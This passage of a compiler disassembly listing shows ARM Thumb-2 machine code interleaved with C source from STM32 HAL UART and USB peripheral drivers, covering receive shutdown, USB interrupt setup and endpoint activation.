  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005cee:	b480      	push	{r7}
 8005cf0:	b095      	sub	sp, #84	; 0x54
 8005cf2:	af00      	add	r7, sp, #0
 8005cf4:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005cf6:	687b      	ldr	r3, [r7, #4]
 8005cf8:	681b      	ldr	r3, [r3, #0]
 8005cfa:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005cfc:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005cfe:	e853 3f00 	ldrex	r3, [r3]
 8005d02:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005d04:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005d06:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005d0a:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005d0c:	687b      	ldr	r3, [r7, #4]
 8005d0e:	681b      	ldr	r3, [r3, #0]
 8005d10:	461a      	mov	r2, r3
 8005d12:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005d14:	643b      	str	r3, [r7, #64]	; 0x40
 8005d16:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d18:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005d1a:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005d1c:	e841 2300 	strex	r3, r2, [r1]
 8005d20:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005d22:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005d24:	2b00      	cmp	r3, #0
 8005d26:	d1e6      	bne.n	8005cf6 <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005d28:	687b      	ldr	r3, [r7, #4]
 8005d2a:	681b      	ldr	r3, [r3, #0]
 8005d2c:	3308      	adds	r3, #8
 8005d2e:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d30:	6a3b      	ldr	r3, [r7, #32]
 8005d32:	e853 3f00 	ldrex	r3, [r3]
 8005d36:	61fb      	str	r3, [r7, #28]
   return(result);
 8005d38:	69fb      	ldr	r3, [r7, #28]
 8005d3a:	f023 0301 	bic.w	r3, r3, #1
 8005d3e:	64bb      	str	r3, [r7, #72]	; 0x48
 8005d40:	687b      	ldr	r3, [r7, #4]
 8005d42:	681b      	ldr	r3, [r3, #0]
 8005d44:	3308      	adds	r3, #8
 8005d46:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005d48:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005d4a:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d4c:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005d4e:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005d50:	e841 2300 	strex	r3, r2, [r1]
 8005d54:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005d56:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005d58:	2b00      	cmp	r3, #0
 8005d5a:	d1e5      	bne.n	8005d28 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005d5c:	687b      	ldr	r3, [r7, #4]
 8005d5e:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005d60:	2b01      	cmp	r3, #1
 8005d62:	d118      	bne.n	8005d96 <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005d64:	687b      	ldr	r3, [r7, #4]
 8005d66:	681b      	ldr	r3, [r3, #0]
 8005d68:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d6a:	68fb      	ldr	r3, [r7, #12]
 8005d6c:	e853 3f00 	ldrex	r3, [r3]
 8005d70:	60bb      	str	r3, [r7, #8]
   return(result);
 8005d72:	68bb      	ldr	r3, [r7, #8]
 8005d74:	f023 0310 	bic.w	r3, r3, #16
 8005d78:	647b      	str	r3, [r7, #68]	; 0x44
 8005d7a:	687b      	ldr	r3, [r7, #4]
 8005d7c:	681b      	ldr	r3, [r3, #0]
 8005d7e:	461a      	mov	r2, r3
 8005d80:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005d82:	61bb      	str	r3, [r7, #24]
 8005d84:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d86:	6979      	ldr	r1, [r7, #20]
 8005d88:	69ba      	ldr	r2, [r7, #24]
 8005d8a:	e841 2300 	strex	r3, r2, [r1]
 8005d8e:	613b      	str	r3, [r7, #16]
   return(result);
 8005d90:	693b      	ldr	r3, [r7, #16]
 8005d92:	2b00      	cmp	r3, #0
 8005d94:	d1e6      	bne.n	8005d64 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005d96:	687b      	ldr	r3, [r7, #4]
 8005d98:	2220      	movs	r2, #32
 8005d9a:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005d9e:	687b      	ldr	r3, [r7, #4]
 8005da0:	2200      	movs	r2, #0
 8005da2:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005da4:	687b      	ldr	r3, [r7, #4]
 8005da6:	2200      	movs	r2, #0
 8005da8:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005daa:	bf00      	nop
 8005dac:	3754      	adds	r7, #84	; 0x54
 8005dae:	46bd      	mov	sp, r7
 8005db0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005db4:	4770      	bx	lr

08005db6 <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005db6:	b084      	sub	sp, #16
 8005db8:	b480      	push	{r7}
 8005dba:	b083      	sub	sp, #12
 8005dbc:	af00      	add	r7, sp, #0
 8005dbe:	6078      	str	r0, [r7, #4]
 8005dc0:	f107 0014 	add.w	r0, r7, #20
 8005dc4:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005dc8:	2300      	movs	r3, #0
}
 8005dca:	4618      	mov	r0, r3
 8005dcc:	370c      	adds	r7, #12
 8005dce:	46bd      	mov	sp, r7
 8005dd0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005dd4:	b004      	add	sp, #16
 8005dd6:	4770      	bx	lr

08005dd8 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005dd8:	b480      	push	{r7}
 8005dda:	b085      	sub	sp, #20
 8005ddc:	af00      	add	r7, sp, #0
 8005dde:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005de0:	687b      	ldr	r3, [r7, #4]
 8005de2:	2200      	movs	r2, #0
 8005de4:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005de8:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005dec:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005dee:	68fb      	ldr	r3, [r7, #12]
 8005df0:	b29a      	uxth	r2, r3
 8005df2:	687b      	ldr	r3, [r7, #4]
 8005df4:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005df8:	2300      	movs	r3, #0
}
 8005dfa:	4618      	mov	r0, r3
 8005dfc:	3714      	adds	r7, #20
 8005dfe:	46bd      	mov	sp, r7
 8005e00:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e04:	4770      	bx	lr

08005e06 <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005e06:	b480      	push	{r7}
 8005e08:	b085      	sub	sp, #20
 8005e0a:	af00      	add	r7, sp, #0
 8005e0c:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005e0e:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005e12:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005e14:	687b      	ldr	r3, [r7, #4]
 8005e16:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005e1a:	b29a      	uxth	r2, r3
 8005e1c:	68fb      	ldr	r3, [r7, #12]
 8005e1e:	b29b      	uxth	r3, r3
 8005e20:	43db      	mvns	r3, r3
 8005e22:	b29b      	uxth	r3, r3
 8005e24:	4013      	ands	r3, r2
 8005e26:	b29a      	uxth	r2, r3
 8005e28:	687b      	ldr	r3, [r7, #4]
 8005e2a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e2e:	2300      	movs	r3, #0
}
 8005e30:	4618      	mov	r0, r3
 8005e32:	3714      	adds	r7, #20
 8005e34:	46bd      	mov	sp, r7
 8005e36:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e3a:	4770      	bx	lr

08005e3c <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8005e3c:	b480      	push	{r7}
 8005e3e:	b083      	sub	sp, #12
 8005e40:	af00      	add	r7, sp, #0
 8005e42:	6078      	str	r0, [r7, #4]
 8005e44:	460b      	mov	r3, r1
 8005e46:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8005e48:	2300      	movs	r3, #0
}
 8005e4a:	4618      	mov	r0, r3
 8005e4c:	370c      	adds	r7, #12
 8005e4e:	46bd      	mov	sp, r7
 8005e50:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e54:	4770      	bx	lr

08005e56 <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005e56:	b084      	sub	sp, #16
 8005e58:	b480      	push	{r7}
 8005e5a:	b083      	sub	sp, #12
 8005e5c:	af00      	add	r7, sp, #0
 8005e5e:	6078      	str	r0, [r7, #4]
 8005e60:	f107 0014 	add.w	r0, r7, #20
 8005e64:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8005e68:	687b      	ldr	r3, [r7, #4]
 8005e6a:	2201      	movs	r2, #1
 8005e6c:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8005e70:	687b      	ldr	r3, [r7, #4]
 8005e72:	2200      	movs	r2, #0
 8005e74:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005e78:	687b      	ldr	r3, [r7, #4]
 8005e7a:	2200      	movs	r2, #0
 8005e7c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8005e80:	687b      	ldr	r3, [r7, #4]
 8005e82:	2200      	movs	r2, #0
 8005e84:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8005e88:	2300      	movs	r3, #0
}
 8005e8a:	4618      	mov	r0, r3
 8005e8c:	370c      	adds	r7, #12
 8005e8e:	46bd      	mov	sp, r7
 8005e90:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e94:	b004      	add	sp, #16
 8005e96:	4770      	bx	lr

08005e98 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8005e98:	b480      	push	{r7}
 8005e9a:	b083      	sub	sp, #12
 8005e9c:	af00      	add	r7, sp, #0
 8005e9e:	6078      	str	r0, [r7, #4]
 8005ea0:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005ea2:	2300      	movs	r3, #0
}
 8005ea4:	4618      	mov	r0, r3
 8005ea6:	370c      	adds	r7, #12
 8005ea8:	46bd      	mov	sp, r7
 8005eaa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005eae:	4770      	bx	lr

08005eb0 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8005eb0:	b480      	push	{r7}
 8005eb2:	b083      	sub	sp, #12
 8005eb4:	af00      	add	r7, sp, #0
 8005eb6:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005eb8:	2300      	movs	r3, #0
}
 8005eba:	4618      	mov	r0, r3
 8005ebc:	370c      	adds	r7, #12
 8005ebe:	46bd      	mov	sp, r7
 8005ec0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ec4:	4770      	bx	lr
	...

08005ec8 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8005ec8:	b480      	push	{r7}
 8005eca:	b09d      	sub	sp, #116	; 0x74
 8005ecc:	af00      	add	r7, sp, #0
 8005ece:	6078      	str	r0, [r7, #4]
 8005ed0:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8005ed2:	2300      	movs	r3, #0
 8005ed4:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8005ed8:	687a      	ldr	r2, [r7, #4]
 8005eda:	683b      	ldr	r3, [r7, #0]
 8005edc:	781b      	ldrb	r3, [r3, #0]
 8005ede:	009b      	lsls	r3, r3, #2
 8005ee0:	4413      	add	r3, r2
 8005ee2:	881b      	ldrh	r3, [r3, #0]
 8005ee4:	b29b      	uxth	r3, r3
 8005ee6:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8005eea:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005eee:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8005ef2:	683b      	ldr	r3, [r7, #0]
 8005ef4:	78db      	ldrb	r3, [r3, #3]
 8005ef6:	2b03      	cmp	r3, #3
 8005ef8:	d81f      	bhi.n	8005f3a <USB_ActivateEndpoint+0x72>
 8005efa:	a201      	add	r2, pc, #4	; (adr r2, 8005f00 <USB_ActivateEndpoint+0x38>)
 8005efc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005f00:	08005f11 	.word	0x08005f11
 8005f04:	08005f2d 	.word	0x08005f2d
 8005f08:	08005f43 	.word	0x08005f43
 8005f0c:	08005f1f 	.word	0x08005f1f
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8005f10:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f14:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8005f18:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f1c:	e012      	b.n	8005f44 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8005f1e:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f22:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 8005f26:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f2a:	e00b      	b.n	8005f44 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8005f2c:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f30:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8005f34:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f38:	e004      	b.n	8005f44 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8005f3a:	2301      	movs	r3, #1
 8005f3c:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8005f40:	e000      	b.n	8005f44 <USB_ActivateEndpoint+0x7c>
      break;
 8005f42:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8005f44:	687a      	ldr	r2, [r7, #4]
 8005f46:	683b      	ldr	r3, [r7, #0]
 8005f48:	781b      	ldrb	r3, [r3, #0]
 8005f4a:	009b      	lsls	r3, r3, #2
 8005f4c:	441a      	add	r2, r3
 8005f4e:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f52:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f56:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005f5a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005f5e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005f62:	b29b      	uxth	r3, r3
 8005f64:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 8005f66:	687a      	ldr	r2, [r7, #4]
 8005f68:	683b      	ldr	r3, [r7, #0]
 8005f6a:	781b      	ldrb	r3, [r3, #0]
 8005f6c:	009b      	lsls	r3, r3, #2
 8005f6e:	4413      	add	r3, r2
 8005f70:	881b      	ldrh	r3, [r3, #0]
 8005f72:	b29b      	uxth	r3, r3
 8005f74:	b21b      	sxth	r3, r3
 8005f76:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005f7a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005f7e:	b21a      	sxth	r2, r3
 8005f80:	683b      	ldr	r3, [r7, #0]
 8005f82:	781b      	ldrb	r3, [r3, #0]
 8005f84:	b21b      	sxth	r3, r3
 8005f86:	4313      	orrs	r3, r2
 8005f88:	b21b      	sxth	r3, r3
 8005f8a:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8005f8e:	687a      	ldr	r2, [r7, #4]
 8005f90:	683b      	ldr	r3, [r7, #0]
 8005f92:	781b      	ldrb	r3, [r3, #0]
 8005f94:	009b      	lsls	r3, r3, #2
 8005f96:	441a      	add	r2, r3
 8005f98:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8005f9c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005fa0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005fa4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005fa8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005fac:	b29b      	uxth	r3, r3
 8005fae:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8005fb0:	683b      	ldr	r3, [r7, #0]
 8005fb2:	7b1b      	ldrb	r3, [r3, #12]
 8005fb4:	2b00      	cmp	r3, #0
 8005fb6:	f040 8178 	bne.w	80062aa <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8005fba:	683b      	ldr	r3, [r7, #0]
 8005fbc:	785b      	ldrb	r3, [r3, #1]
 8005fbe:	2b00      	cmp	r3, #0
 8005fc0:	f000 8084 	beq.w	80060cc <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8005fc4:	687b      	ldr	r3, [r7, #4]
 8005fc6:	61bb      	str	r3, [r7, #24]
 8005fc8:	687b      	ldr	r3, [r7, #4]
 8005fca:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8005fce:	b29b      	uxth	r3, r3
 8005fd0:	461a      	mov	r2, r3
 8005fd2:	69bb      	ldr	r3, [r7, #24]
 8005fd4:	4413      	add	r3, r2
 8005fd6:	61bb      	str	r3, [r7, #24]
 8005fd8:	683b      	ldr	r3, [r7, #0]
 8005fda:	781b      	ldrb	r3, [r3, #0]
 8005fdc:	00da      	lsls	r2, r3, #3
 8005fde:	69bb      	ldr	r3, [r7, #24]
 8005fe0:	4413      	add	r3, r2
 8005fe2:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8005fe6:	617b      	str	r3, [r7, #20]
 8005fe8:	683b      	ldr	r3, [r7, #0]
 8005fea:	88db      	ldrh	r3, [r3, #6]
 8005fec:	085b      	lsrs	r3, r3, #1
 8005fee:	b29b      	uxth	r3, r3
 8005ff0:	005b      	lsls	r3, r3, #1
 8005ff2:	b29a      	uxth	r2, r3
 8005ff4:	697b      	ldr	r3, [r7, #20]
 8005ff6:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8005ff8:	687a      	ldr	r2, [r7, #4]
 8005ffa:	683b      	ldr	r3, [r7, #0]
 8005ffc:	781b      	ldrb	r3, [r3, #0]
 8005ffe:	009b      	lsls	r3, r3, #2
 8006000:	4413      	add	r3, r2
 8006002:	881b      	ldrh	r3, [r3, #0]
 8006004:	827b      	strh	r3, [r7, #18]
 8006006:	8a7b      	ldrh	r3, [r7, #18]
 8006008:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800600c:	2b00      	cmp	r3, #0
 800600e:	d01b      	beq.n	8006048 <USB_ActivateEndpoint+0x180>
 8006010:	687a      	ldr	r2, [r7, #4]
 8006012:	683b      	ldr	r3, [r7, #0]
 8006014:	781b      	ldrb	r3, [r3, #0]
 8006016:	009b      	lsls	r3, r3, #2
 8006018:	4413      	add	r3, r2
 800601a:	881b      	ldrh	r3, [r3, #0]
 800601c:	b29b      	uxth	r3, r3
 800601e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006022:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006026:	823b      	strh	r3, [r7, #16]
 8006028:	687a      	ldr	r2, [r7, #4]
 800602a:	683b      	ldr	r3, [r7, #0]
 800602c:	781b      	ldrb	r3, [r3, #0]
 800602e:	009b      	lsls	r3, r3, #2
 8006030:	441a      	add	r2, r3
 8006032:	8a3b      	ldrh	r3, [r7, #16]
 8006034:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006038:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800603c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006040:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006044:	b29b      	uxth	r3, r3
 8006046:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006048:	683b      	ldr	r3, [r7, #0]
 800604a:	78db      	ldrb	r3, [r3, #3]
 800604c:	2b01      	cmp	r3, #1
 800604e:	d020      	beq.n	8006092 <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006050:	687a      	ldr	r2, [r7, #4]
 8006052:	683b      	ldr	r3, [r7, #0]
 8006054:	781b      	ldrb	r3, [r3, #0]
 8006056:	009b      	lsls	r3, r3, #2
 8006058:	4413      	add	r3, r2
 800605a:	881b      	ldrh	r3, [r3, #0]
 800605c:	b29b      	uxth	r3, r3
 800605e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006062:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006066:	81bb      	strh	r3, [r7, #12]
 8006068:	89bb      	ldrh	r3, [r7, #12]
 800606a:	f083 0320 	eor.w	r3, r3, #32
 800606e:	81bb      	strh	r3, [r7, #12]
 8006070:	687a      	ldr	r2, [r7, #4]
 8006072:	683b      	ldr	r3, [r7, #0]
 8006074:	781b      	ldrb	r3, [r3, #0]
 8006076:	009b      	lsls	r3, r3, #2
 8006078:	441a      	add	r2, r3
 800607a:	89bb      	ldrh	r3, [r7, #12]
 800607c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006080:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006084:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006088:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800608c:	b29b      	uxth	r3, r3
 800608e:	8013      	strh	r3, [r2, #0]
 8006090:	e2d5      	b.n	800663e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006092:	687a      	ldr	r2, [r7, #4]
 8006094:	683b      	ldr	r3, [r7, #0]
 8006096:	781b      	ldrb	r3, [r3, #0]
 8006098:	009b      	lsls	r3, r3, #2
 800609a:	4413      	add	r3, r2
 800609c:	881b      	ldrh	r3, [r3, #0]
 800609e:	b29b      	uxth	r3, r3
 80060a0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80060a4:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80060a8:	81fb      	strh	r3, [r7, #14]
 80060aa:	687a      	ldr	r2, [r7, #4]
 80060ac:	683b      	ldr	r3, [r7, #0]
 80060ae:	781b      	ldrb	r3, [r3, #0]
 80060b0:	009b      	lsls	r3, r3, #2
 80060b2:	441a      	add	r2, r3
 80060b4:	89fb      	ldrh	r3, [r7, #14]
 80060b6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80060ba:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80060be:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80060c2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80060c6:	b29b      	uxth	r3, r3
 80060c8:	8013      	strh	r3, [r2, #0]
 80060ca:	e2b8      	b.n	800663e <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 80060cc:	687b      	ldr	r3, [r7, #4]
 80060ce:	633b      	str	r3, [r7, #48]	; 0x30
 80060d0:	687b      	ldr	r3, [r7, #4]
 80060d2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80060d6:	b29b      	uxth	r3, r3
 80060d8:	461a      	mov	r2, r3
 80060da:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060dc:	4413      	add	r3, r2
 80060de:	633b      	str	r3, [r7, #48]	; 0x30
 80060e0:	683b      	ldr	r3, [r7, #0]
 80060e2:	781b      	ldrb	r3, [r3, #0]
 80060e4:	00da      	lsls	r2, r3, #3
 80060e6:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060e8:	4413      	add	r3, r2
